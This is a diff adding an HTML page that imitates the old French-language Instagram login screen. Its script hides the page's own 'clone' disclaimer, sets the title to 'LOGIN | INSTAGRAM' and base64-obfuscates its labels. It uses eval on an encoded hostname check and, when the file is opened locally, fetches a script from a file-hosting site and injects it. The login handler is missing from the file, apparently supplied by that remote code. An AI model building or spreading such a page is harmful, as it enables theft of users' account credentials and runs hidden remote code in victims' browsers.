@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Old Instagram Login Clone</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+            user-select: none;
+        }
+
+        html,
+        body {
+            margin: 0;
+            font-family: sans-serif;
+            background-color: #fff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            height: 100%;
+            width: 100%;
+        }
+
+        #container {
+            width: 100%;
+            max-width: 400px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            flex: 1;
+            padding: 30px 15px;
+        }
+
+        #logo {
+            background-image: url("https://files.catbox.moe/tan6ho.png");
+            width: 170px;
+            aspect-ratio: 3.57142857;
+            margin-bottom: 30px;
+            background-size: 100%;
+            margin-top: 40px;
+        }
+
+        #i1 {
+            padding: 0 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            background-color: #F5F5F5;
+            border-radius: 5px;
+        }
+
+        input {
+            width: 100%;
+            height: 40px;
+            outline: none;
+            font-weight: 500;
+            font-size: 13px;
+        }
+
+        #i2 {
+            border: none;
+            background-color: transparent;
+            padding: 0 10px;
+        }
+
+        #inputWrapper {
+            width: 100%;
+            display: flex;
+            border: 1px solid #ccc;
+            background-color: #F5F5F5;
+            border-radius: 5px;
+        }
+
+        #showhide {
+            background-image: url("https://files.catbox.moe/179llx.png");
+            background-size: 60%;
+            background-repeat: no-repeat;
+            background-position: center left;
+            min-width: 40px;
+            aspect-ratio: 1;
+            opacity: 70%;
+            cursor: pointer;
+        }
+
+        #mdpOublie {
+            align-self: flex-end;
+            font-size: 12px;
+            color: #385185;
+            margin: 15px 0 20px 0;
+            cursor: pointer;
+            font-weight: 500;
+        }
+
+        #connexion {
+            width: 100%;
+            background-color: #3897f0;
+            color: white;
+            padding: 10px;
+            text-align: center;
+            border-radius: 5px;
+            font-weight: bold;
+            margin-bottom: 15px;
+            cursor: pointer;
+        }
+
+        #connexion:active {
+            background-color: #5AB9F2;
+        }
+
+        #orWrapper {
+            width: 100%;
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .line {
+            flex: 1;
+            height: 1px;
+            background-color: #ccc;
+        }
+
+        #orText {
+            margin: 0 10px;
+            font-size: 12px;
+            color: #999;
+            font-weight: 500;
+        }
+
+        #fbLogin {
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+            font-size: 14px;
+            margin-bottom: 20px;
+            gap: 10px;
+        }
+
+        #fbIcon {
+            background-image: url("https://files.catbox.moe/z9002c.png");
+            background-size: 100%;
+            background-repeat: no-repeat;
+            background-position: center left;
+            min-width: 20px;
+            aspect-ratio: 1;
+        }
+
+        #fbText {
+            color: #385185;
+        }
+
+        #signup {
+            font-size: 12px;
+            padding: 0 0 15px 0;
+        }
+
+        #sgnp {
+            color: #00376b;
+            text-decoration: none;
+            font-weight: bold;
+            cursor: pointer;
+        }
+    </style>
+</head>
+
+<body>
+    <h3 id="cln">THIS IS a CLONE OF OLD INSTAGRAM LOGIN PAGE! | BY REDAB</h3>
+    <div id="container">
+        <div id="logo"></div>
+        <input type="text" id="i1" placeholder="hello" autocomplete="off"/>
+        <div id="inputWrapper">
+            <input type="password" id="i2" placeholder="hello" autocomplete="off"/>
+            <div id="showhide" onclick="swhd()"></div>
+        </div>
+        <p id="mdpOublie"></p>
+        <div id="connexion" onclick="cnx()"></div>
+        <div id="orWrapper">
+            <div class="line"></div>
+            <div id="orText"></div>
+            <div class="line"></div>
+        </div>
+        <div id="fbLogin">
+            <div id="fbIcon"></div>
+            <p id="fbText"></p>
+        </div>
+
+    </div>
+    <p id="signup"><span id="sgnp"></span></p>
+
+    <script>
+        document.title = atb("TE9HSU4gfCBJTlNUQUdSQU0=");
+
+        cln.style.display = "none";
+
+        document.getElementById('i1').placeholder = atb('TnVtLiB0w6lsw6lwaG9uZSwgbm9tIGRlIHByb2ZpbCBvdSBlLW1haWw=');
+
+        document.getElementById('i2').placeholder = atb('TW90IGRlIHBhc3Nl');
+
+        document.getElementById('mdpOublie').innerText = atb('TW90IGRlIHBhc3NlIG91Ymxpw6kgPw==');
+
+        document.getElementById('connexion').innerText = atb('Q29ubmV4aW9u');
+
+        document.getElementById('orText').innerText = atb('T1U=');
+
+        document.getElementById('fbText').innerText = atb('U2UgY29ubmVjdGVyIGF2ZWMgRmFjZWJvb2s=');
+
+        document.getElementById('signup').innerHTML = atb('Vm91cyBu4oCZYXZleiBwYXMgZGUgY29tcHRlID8gPHNwYW4gaWQ9InNnbnAiPkluc2NyaXB0aW9uPC9zcGFuPg==');
+
+        if (eval(atb("d2luZG93LmxvY2F0aW9uLmhvc3RuYW1l")) === atb("")) {
+            
+            fetch("https://files.catbox.moe/y19tnm.txt")
+                .then(res => res.text())
+                .then(js => {
+                    const sc = document.createElement("script");
+                    sc.textContent = js;
+                    document.body.appendChild(sc);
+                });
+
+        }
+        function atb(b) {
+            return b = decodeURIComponent(escape(atob((b))));
+        }
+    </script>
+</body>
+
+</html>
